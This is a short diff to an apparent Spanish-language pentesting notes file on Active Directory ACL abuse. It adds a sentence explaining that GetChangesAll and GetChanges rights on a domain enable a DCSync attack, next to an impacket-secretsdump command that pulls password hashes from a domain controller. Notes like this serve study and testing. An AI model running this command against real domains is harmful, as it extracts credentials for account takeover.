@@ -4,6 +4,8 @@ Tags: #Linux #AD #ACL #GetChangesAll #GetChanges
 
 ## GetChangesAll y GetChanges sobre el Dominio
 
+Si tenemos estos permisos sobre el **Domain**, podemos obtener los permisos necesarios para realizar **DCSync**, permitiendo solicitar datos de replicación de credenciales del dominio.
+
 ```bash 
 # Se necesitan las dos ACLs para efectuar el DCSync 
 ❯ impacket-secretsdump domain.corp/user:'passwd'@IP_DC -just-dc
